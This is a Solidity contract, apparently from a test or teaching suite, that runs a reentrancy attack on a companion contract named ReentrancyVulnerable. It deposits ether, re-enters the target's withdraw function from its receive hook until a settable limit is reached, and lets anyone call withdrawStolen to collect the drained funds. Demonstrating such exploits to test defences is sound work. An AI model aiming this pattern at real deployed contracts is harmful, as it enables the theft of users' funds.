// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../vulnerable/ReentrancyVulnerable.sol";


contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint256 public attackAmount;
    uint256 public maxReentrancy = 3; // Limit to prevent gas issues in tests
    uint256 public reentrancyCount;
    
    event AttackStarted(uint256 amount);
    event ReentrancyExecuted(uint256 count, uint256 balance);
    event AttackCompleted(uint256 stolenAmount);
    
    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }
    
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        
        attackAmount = msg.value;
        reentrancyCount = 0;
        
        emit AttackStarted(attackAmount);
        
        // Step 1: Deposit ETH to establish balance
        target.deposit{value: attackAmount}();
        
        // Step 2: Start the reentrancy attack
        target.withdraw(attackAmount);
        
        emit AttackCompleted(address(this).balance);
    }
    
    // This function will be called when target contract sends ETH
    receive() external payable {
        reentrancyCount++;
        emit ReentrancyExecuted(reentrancyCount, address(this).balance);
        
        // Continue reentrancy if conditions are met
        if (reentrancyCount < maxReentrancy && 
            target.getContractBalance() >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
    
    function withdrawStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function setMaxReentrancy(uint256 _max) external {
        maxReentrancy = _max;
    }
}